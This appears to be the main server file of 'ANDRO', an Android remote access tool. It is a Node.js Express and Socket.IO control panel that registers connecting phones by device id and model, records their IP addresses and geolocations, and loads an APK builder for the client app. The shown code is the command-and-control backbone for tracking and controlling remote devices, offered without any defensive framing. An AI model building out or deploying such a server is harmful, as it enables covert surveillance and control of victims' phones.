/* 
*   ANDRO
*   By AryanVBW
*/

const
    express = require('express'),
    app = express(),
    { Server } = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder'),
    debug = require('./includes/debug');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Development mode configuration
if (process.env.NODE_ENV === 'development') {
    debug.server('Running in development mode');
    app.disable('view cache');
}

// Set up express
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// Create HTTP server
const server = app.listen(CONST.web_port, () => {
    debug.server(`Web server listening on port ${CONST.web_port}`);
});

// Initialize Socket.IO
const client_io = new Server(server);
debug.server(`Socket.IO attached to web server`);

client_io.engine.pingInterval = 30000;
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    debug.socket(`New client connected: ${clientParams.id} from ${clientIP}`);

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (process.env.NODE_ENV === 'development') {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);
            debug.socket(`Socket event: ${args[0]}`, args.slice(1));
        };
    }
});
